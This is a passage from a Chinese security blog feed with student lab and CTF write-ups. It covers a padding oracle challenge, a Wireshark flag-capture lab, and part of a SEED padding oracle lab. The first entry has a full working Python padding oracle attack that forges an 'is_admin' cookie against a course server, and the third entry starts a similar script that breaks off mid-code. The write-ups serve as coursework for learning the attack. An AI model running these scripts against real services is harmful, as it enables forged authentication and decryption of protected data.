    <title>【网络攻防大作业】Magic Padding Oracle实验报告</title>
    <url>/posts/8f883717.html</url>
    <content><![CDATA[<h2 id="Magic-Padding-Oracle-WriteUp"><a href="#Magic-Padding-Oracle-WriteUp" class="headerlink" title="Magic Padding Oracle WriteUp"></a>Magic Padding Oracle WriteUp</h2><p>无需搭建环境、直接连接服务器<code>nc 202.120.1.66 1069</code></p>
<p>服务器程序会判断客户端发送的密文填充是否有效，如果有效，则提取解密的cookie信息，并判断其中的<code>&quot;is_admin&quot;</code>和<code>&quot;exptime&quot;</code>是否符合要求，如果满足要求，则打印flag值。因此本实验任务为构造合适的密文。</p>
<h3 id="Padding-Oracle攻击"><a href="#Padding-Oracle攻击" class="headerlink" title="Padding Oracle攻击"></a>Padding Oracle攻击</h3><p><code>nc 202.120.1.66 1069</code>连接到服务器，输入示例cookie，结果如下。</p>
<p>&#x2F;img&#x2F;posts&#x2F;<img src="/img/posts/2024-1-1-Padding_Oracle.assets/image-20231231160545230.png" alt="image-20231231160545230"></p>
<p>可以利用Padding Oracle攻击修改密文。具体原理参考下图：</p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle.assets/image-20240101004911270.png" alt="image-20240101004911270"></p>
<p>实现python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR two bytearrays</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">first, second</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">bytearray</span>(x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(first, second))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.s.connect((host, port))</span><br><span class="line">        <span class="variable language_">self</span>.s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="variable language_">self</span>.s.recv(<span class="number">25</span>)</span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.s.recv(<span class="number">192</span>).decode().strip()</span><br><span class="line">        <span class="comment"># print(&quot;sample_cookie: &quot;, ciphertext[0:192])</span></span><br><span class="line">        <span class="variable language_">self</span>.ctext = unhexlify(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ctext: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._send(hexlify(ctext))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self</span>):</span><br><span class="line">        tmp = <span class="variable language_">self</span>.s.recv(<span class="number">1024</span>)</span><br><span class="line">        resp = <span class="variable language_">self</span>.s.recv(<span class="number">15</span>).decode().strip()</span><br><span class="line">        <span class="keyword">return</span> resp </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, hexstr: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.send(hexstr + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    oracle = PaddingOracle(<span class="string">&#x27;202.120.1.66&#x27;</span>, <span class="number">1069</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the IV + Ciphertext from the oracle</span></span><br><span class="line">    iv_and_ctext = <span class="built_in">bytearray</span>(oracle.ctext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(iv_and_ctext))</span><br><span class="line">    <span class="comment"># Num of ctext</span></span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">len</span>(iv_and_ctext)/<span class="number">16</span> - <span class="number">1</span>)</span><br><span class="line">    plain_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    fake_plain_text = <span class="built_in">bytearray</span>(<span class="string">&#x27;&#123;&quot;username&quot;: &quot;User&quot;, &quot;is_admin&quot;: &quot;true&quot;, &quot;expires&quot;: &quot;2025-01-01&quot;&#125;&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    fake_plain_text += <span class="string">b&#x27;\x0f&#x27;</span>*<span class="number">15</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(fake_plain_text))</span><br><span class="line">    D_list = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(iv_and_ctext))</span><br><span class="line">    fake_C_list = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(iv_and_ctext))</span><br><span class="line">    fake_C_list[-<span class="number">16</span>:] = iv_and_ctext[-<span class="number">16</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># get last run result</span></span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;fake_tmp.txt&#x27;</span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;fake_tmp.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            post_tmp_input = <span class="built_in">bytearray</span>.fromhex(file.readline().strip())</span><br><span class="line">            post_fake_C_list = <span class="built_in">bytearray</span>.fromhex(file.readline().strip())</span><br><span class="line">            post_D_list = <span class="built_in">bytearray</span>.fromhex(file.readline().strip())</span><br><span class="line">            post_D = <span class="built_in">bytearray</span>.fromhex(file.readline().strip())</span><br><span class="line">            post_CC = <span class="built_in">bytearray</span>.fromhex(file.readline().strip())</span><br><span class="line">            post_P = <span class="built_in">bytearray</span>.fromhex(file.readline().strip())</span><br><span class="line">            post_plain_text = <span class="built_in">str</span>(file.readline()).rstrip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            post_n = <span class="built_in">int</span>(file.readline())</span><br><span class="line">            post_K = <span class="built_in">int</span>(file.readline())</span><br><span class="line">            post_i = <span class="built_in">int</span>(file.readline())</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        </span><br><span class="line">        C = iv_and_ctext[(num-n)*<span class="number">16</span>: (num-n+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">if</span> n == num:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;IV:  &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;C<span class="subst">&#123;num-n&#125;</span>: &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> n &lt; post_n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># initialize D, IV, P</span></span><br><span class="line">        D = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        CC = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        P = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Solve D</span></span><br><span class="line">        <span class="keyword">for</span> K <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> K &lt; post_K:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">                    <span class="keyword">if</span> i &lt; post_i:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">elif</span> i == post_i:</span><br><span class="line">                        flag = <span class="literal">False</span></span><br><span class="line">                        CC = post_CC</span><br><span class="line">                        D = post_D</span><br><span class="line">                        P = post_P</span><br><span class="line">                        D_list = post_D_list</span><br><span class="line">                        plain_text = post_plain_text</span><br><span class="line">                        D_list = post_D_list</span><br><span class="line">                        fake_C_list = post_fake_C_list</span><br><span class="line">                        </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;processing: <span class="subst">&#123;num-n&#125;</span>-<span class="subst">&#123;K&#125;</span>-<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;num&#125;</span>-<span class="subst">&#123;<span class="number">16</span>&#125;</span>-<span class="subst">&#123;<span class="number">256</span>&#125;</span>&quot;</span>)</span><br><span class="line">                CC[<span class="number">16</span> - K] = i</span><br><span class="line">                <span class="comment"># initialize input</span></span><br><span class="line">                tmp_input = iv_and_ctext[<span class="number">0</span>:(num+<span class="number">1</span>-n)*<span class="number">16</span>]</span><br><span class="line">                tmp_input[(num-<span class="number">1</span> - n)*<span class="number">16</span>:(num - n)*<span class="number">16</span>] = CC</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">                status = oracle.decrypt(tmp_input)</span><br><span class="line">                oracle = PaddingOracle(<span class="string">&#x27;202.120.1.66&#x27;</span>, <span class="number">1069</span>)</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># save to file</span></span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;fake_tmp<span class="subst">&#123;num-n&#125;</span>-<span class="subst">&#123;K&#125;</span>.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                        file.write(tmp_input.<span class="built_in">hex</span>() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        file.write(fake_C_list.<span class="built_in">hex</span>() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        file.write(D_list.<span class="built_in">hex</span>() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        file.write(D.<span class="built_in">hex</span>() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        file.write(CC.<span class="built_in">hex</span>() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        file.write(P.<span class="built_in">hex</span>() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                    </span><br><span class="line">                        file.write(<span class="built_in">str</span>(plain_text) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        file.write(<span class="built_in">str</span>(n) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        file.write(<span class="built_in">str</span>(K) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        file.write(<span class="built_in">str</span>(i) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> status != <span class="string">&quot;invalid padding&quot;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;status: &quot;</span>, status)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Valid: i = 0x&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;D: &quot;</span>+ D.<span class="built_in">hex</span>())</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;CC: &quot;</span> + CC.<span class="built_in">hex</span>())</span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># Update D</span></span><br><span class="line">                    D[<span class="number">16</span> - K] = i^K</span><br><span class="line">                    <span class="comment"># Update CC</span></span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, K+<span class="number">1</span>):</span><br><span class="line">                        CC[<span class="number">16</span> - j] = D[<span class="number">16</span> - j]^(K+<span class="number">1</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">255</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">     </span><br><span class="line">        <span class="comment"># Once you get all the 16 bytes of D, you can easily get P</span></span><br><span class="line">        fake_P = fake_plain_text[(num-n-<span class="number">1</span>)*<span class="number">16</span>:(num-n)*<span class="number">16</span>]</span><br><span class="line">        fake_CC = xor(fake_P, D)</span><br><span class="line">        fake_C_list[(num-n-<span class="number">1</span>)*<span class="number">16</span>: (num-n)*<span class="number">16</span>] = fake_CC </span><br><span class="line">        iv_and_ctext[(num-n-<span class="number">1</span>)*<span class="number">16</span>: (num-n)*<span class="number">16</span>] = fake_CC </span><br><span class="line">        </span><br><span class="line">        P = xor(C, D)</span><br><span class="line">        D_list[(num-n)*<span class="number">16</span>:(num-n+<span class="number">1</span>)*<span class="number">16</span>] = D</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;P:  &quot;</span> + P.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fake_P: &quot;</span>, fake_P)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fake_CC: &quot;</span>, fake_CC)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fake_C_list: &quot;</span>, fake_C_list.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;iv_and_ctext: &quot;</span>, iv_and_ctext.<span class="built_in">hex</span>())</span><br><span class="line">        </span><br><span class="line">        tmp_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_P)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">len</span>(fake_P))</span><br><span class="line">            tmp_text += <span class="built_in">chr</span>(fake_P[j])</span><br><span class="line">        plain_text = tmp_text+plain_text</span><br><span class="line">       </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Plaintext: &quot;</span> + plain_text)</span><br><span class="line">    plain_text = <span class="built_in">bytearray</span>(plain_text, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将原来的example_cookie修改为满足要求的fake_cookie，然后获取其对应的密文。</p>
<p>由于服务器不是很稳定，很容易卡住或崩溃，考虑将中间结果保存下来以备下次使用。</p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle.assets/image-20240101093325410.png" alt="image-20240101093325410"></p>
<p>获取到伪造密文：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">8896dc585b850bee8da883eb5e042e27fbc364f7556876db74968ea8d15d9a162e74d20574276440c83266f33fb26c52dfe9c377028b821dcf098b7985db9f742b28724f9b02c8a53a925e0281e4ec7797430337b9187c93141d9ff994473d92</span><br></pre></td></tr></table></figure>

<p>成功获取到 flag{0r4cl3s_c4n_l34k_ae6a}</p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle.assets/image-20240101093256130.png" alt="image-20240101093256130"></p>
]]></content>
      <tags>
        <tag>密码</tag>
        <tag>Padding Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络攻防大作业】Open_the_Floodgate实验报告</title>
    <url>/posts/5e4ccf7.html</url>
    <content><![CDATA[<h2 id="Open-the-Floodgate-WriteUp"><a href="#Open-the-Floodgate-WriteUp" class="headerlink" title="Open_the_Floodgate WriteUp"></a>Open_the_Floodgate WriteUp</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>修改Flag为学号</p>
<p>运行docker程序<code>sudo ./dockerHelper.sh -k</code>（注：需要<code>chmod +x</code>修改脚本的权限），访问<a href="http://127.0.0.1:3580/%EF%BC%8C%E7%95%8C%E9%9D%A2%E5%A6%82%E4%B8%8B">http://127.0.0.1:3580/，界面如下</a></p>
<p><img src="/img/posts/2024-1-1-Open_the_Floodgate.assets/image-20231231132934965.png" alt="image-20231231132934965"></p>
<h3 id="2-流量监测"><a href="#2-流量监测" class="headerlink" title="2.流量监测"></a>2.流量监测</h3><p>执行curl.sh脚本，curl.sh脚本如下：可以看到对web网页的多个网址进行扫描。</p>
<p><img src="/img/posts/2024-1-1-Open_the_Floodgate.assets/image-20231231133331947.png" alt="image-20231231133331947"></p>
<p>抓取数据包如下：</p>
<p><img src="/img/posts/2024-1-1-Open_the_Floodgate.assets/image-20231231133241999.png" alt="image-20231231133241999"></p>
<h3 id="3-WriteUp"><a href="#3-WriteUp" class="headerlink" title="3. WriteUp"></a>3. WriteUp</h3><p>查看数据包中web端对用户的request请求回复内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://127.0.0.1:3580/</span><br><span class="line">&lt;h1&gt;&lt;center&gt;&lt;a href=&#x27;https://en.wikipedia.org/wiki/Packet_analyzer&#x27; target=&#x27;_blank&#x27;&gt;Packet Analyzer&lt;/a&gt;&lt;/center&gt;&lt;/h1&gt;&lt;h1&gt;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3580/flag</span><br><span class="line">&lt;h1&gt;&lt;center&gt;The flag is: kM:juSh4/QnGJ0</span><br><span class="line">&lt;/center&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3580/apple</span><br><span class="line">&lt;h1&gt;&lt;center&gt;Welcome to apple&lt;/center&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3580/flag</span><br><span class="line">&lt;h1&gt;&lt;center&gt;The flag is: );n#Mhrb]x&#x27;i~D &lt;/center&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3580/flag</span><br><span class="line">&lt;h1&gt;&lt;center&gt;The flag is: BmkX&#x27;Z]vq7A/;d&#x27;n&lt;&lt;/center&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3580/book</span><br><span class="line">&lt;h1&gt;&lt;center&gt;Welcome to book&lt;/center&gt;&lt;/h1&gt;&lt;h1&gt;&lt;center&gt;&lt;a href=&#x27;https://en.wikipedia.org/wiki/User_Datagram_Protocol#Comparison_of_UDP_and_TCP&#x27; target=&#x27;_blank&#x27;&gt;UDP vs. TCP&lt;/a&gt;&lt;/center&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3580/capture</span><br><span class="line">&lt;h1&gt;&lt;center&gt;&lt;a href=&#x27;https://en.wikipedia.org/wiki/User_Datagram_Protocol#Comparison_of_UDP_and_TCP&#x27; target=&#x27;_blank&#x27;&gt;UDP vs. TCP&lt;/a&gt;&lt;/center&gt;&lt;/h1&gt;[12/31/23]</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3580/sniff</span><br><span class="line">&lt;h1&gt;&lt;center&gt;&lt;a href=&#x27;https://datatracker.ietf.org/doc/html/rfc1035&#x27; target=&#x27;_blank&#x27;&gt;RFC 1035&lt;/a&gt;&lt;/center&gt;&lt;/h1&gt;[12/31/23]</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3580/flag</span><br><span class="line">&lt;h1&gt;&lt;center&gt;The flag is: R&gt;`D,j&amp;D&lt;/center&gt;&lt;/h1&gt;[12/31/23]</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3580/code</span><br><span class="line">&lt;h1&gt;&lt;center&gt;Welcome to code&lt;/center&gt;&lt;/h1&gt;[12/31/23]</span><br></pre></td></tr></table></figure>

<p>发现<code>curl http://127.0.0.1:3580/flag</code>的结果为随机值，查看flaskweb端处理源码，发现确实是随机值，</p>
<p><img src="/img/posts/2024-1-1-Open_the_Floodgate.assets/image-20231231142741985.png" alt="image-20231231142741985"></p>
<p>真实flag处理逻辑如下：</p>
<p><img src="/img/posts/2024-1-1-Open_the_Floodgate.assets/image-20231231142809244.png" alt="image-20231231142809244"></p>
<p><img src="/img/posts/2024-1-1-Open_the_Floodgate.assets/image-20231231142754937.png" alt="image-20231231142754937"></p>
<p>可以看出为访问<code>/capture</code>url后调用<code>flood_http</code>函数，其中会随机出现flag值，其余值均为<code>123456789012</code></p>
<p>因此访问<code>/capture</code>后过滤udp协议并且过滤掉为<code>123456789012</code>的包。结果如下，成功获取flag。</p>
<p><img src="/img/posts/2024-1-1-Open_the_Floodgate.assets/image-20231231142616792.png" alt="image-20231231142616792"></p>
]]></content>
      <tags>
        <tag>网络</tag>
        <tag>流量监测</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络攻防大作业】Magic Padding Oracle实验报告</title>
    <url>/posts/8f883717.html</url>
    <content><![CDATA[<h1 id="Padding-Oracle实验报告"><a href="#Padding-Oracle实验报告" class="headerlink" title="Padding Oracle实验报告"></a>Padding Oracle实验报告</h1><h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1. Overview"></a>1. Overview</h2><p>Padding Oracle：一些系统在解密密文时，会先验证其填充是否合法，如果不合法则会抛出异常。针对此行为的攻击即为padding oracle攻击</p>
<h2 id="2-Lab-Environment"><a href="#2-Lab-Environment" class="headerlink" title="2. Lab Environment"></a>2. Lab Environment</h2><ul>
<li>Seed虚拟机</li>
<li>Labsetup.zip</li>
</ul>
<p>使用<code>dcbuild</code>和<code>dcup</code>命令启动docker环境</p>
<h2 id="3-Task1：Getting-Familiar-with-Padding"><a href="#3-Task1：Getting-Familiar-with-Padding" class="headerlink" title="3. Task1：Getting Familiar with Padding"></a>3. Task1：Getting Familiar with Padding</h2><p>Padding：分组加密算法要求明文长度需要为分组长度的整数倍。因此需要padding填充末尾使长度满足要求</p>
<p>使用<code>echo -n</code>创建文件P，长度为5。<code>-n</code>参数表示结尾不带换行符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -n &quot;12345&quot; &gt; P</span><br></pre></td></tr></table></figure>

<p>使用openssl命令对文件进行加密，并且对加密文件解密查看padding</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加密</span></span><br><span class="line">openssl enc -aes-128-cbc -e -in P -out C</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解密</span></span><br><span class="line">openssl enc -aes-128-cbc -d -nopad -in C -out P_new</span><br></pre></td></tr></table></figure>

<p>结果如下，可以看出P_new文件内容末尾出现<code>&#39;\x0a&#39;</code>，文件长度变为16。表明加密过程进行了padding <code>&#39;\x0a&#39;</code>字符到16位的操作。</p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231230192916386.png" alt="image-20231230192916386"></p>
<p>分别尝试文件长度为10， 16的文件，结果如下，可以得出padding规律（要填充的位数作为填充字符）</p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231230193317519.png" alt="image-20231230193317519"></p>
<h2 id="4-Task2：Padding-Oracle-Attack（level-1）"><a href="#4-Task2：Padding-Oracle-Attack（level-1）" class="headerlink" title="4. Task2：Padding Oracle Attack（level 1）"></a>4. Task2：Padding Oracle Attack（level 1）</h2><p> 连接server端，获取到IV与密文</p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231230193641177.png" alt="image-20231230193641177"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">01020304050607080102030405060708	# IV</span><br><span class="line">a9b2554b0944118061212098f2f238cd779ea0aae3d9d020f3677bfcb3cda9ce # ciphertext</span><br></pre></td></tr></table></figure>

<p>可以与server交互，向server发送输入，输入应为IV+密文，server会使用其K和IV解密，并且返回padding是否有效。尝试通过返回信息来得出密文的真实内容。</p>
<p>server端对密文解密过程如下，为CBC模式。padding oracle攻击的原理为假设未知Plaintext P2的填充位为0x01，那么可以通过构造C1来与D2异或使解密的P2填充位为0x01，此时server端会返回Valid信息，可以解出未知的D2.当D2完全解出时，即可使用正确C1与D2异或获取明文。</p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbGVjYWx0ZWNo,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p><code>manual_attack.py</code>脚本如下，对通过尝试C1末位256种字符解出D2末位值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR two bytearrays</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">first, second</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">bytearray</span>(x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(first, second))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.s.connect((host, port))</span><br><span class="line"></span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="variable language_">self</span>.ctext = unhexlify(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ctext: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._send(hexlify(ctext))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="keyword">return</span> resp </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, hexstr: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.send(hexstr + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    oracle = PaddingOracle(<span class="string">&#x27;10.9.0.80&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the IV + Ciphertext from the oracle</span></span><br><span class="line">    iv_and_ctext = <span class="built_in">bytearray</span>(oracle.ctext)</span><br><span class="line">    IV    = iv_and_ctext[<span class="number">00</span>:<span class="number">16</span>]</span><br><span class="line">    C1    = iv_and_ctext[<span class="number">16</span>:<span class="number">32</span>]  <span class="comment"># 1st block of ciphertext</span></span><br><span class="line">    C2    = iv_and_ctext[<span class="number">32</span>:<span class="number">48</span>]  <span class="comment"># 2nd block of ciphertext</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C1:  &quot;</span> + C1.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C2:  &quot;</span> + C2.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment"># Here, we initialize D2 with C1, so when they are XOR-ed,</span></span><br><span class="line">    <span class="comment"># The result is 0. This is not required for the attack.</span></span><br><span class="line">    <span class="comment"># Its sole purpose is to make the printout look neat.</span></span><br><span class="line">    <span class="comment"># In the experiment, we will iteratively replace these values.</span></span><br><span class="line">    D2 = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    D2[<span class="number">0</span>]  = C1[<span class="number">0</span>]</span><br><span class="line">    D2[<span class="number">1</span>]  = C1[<span class="number">1</span>]</span><br><span class="line">    D2[<span class="number">2</span>]  = C1[<span class="number">2</span>]</span><br><span class="line"> 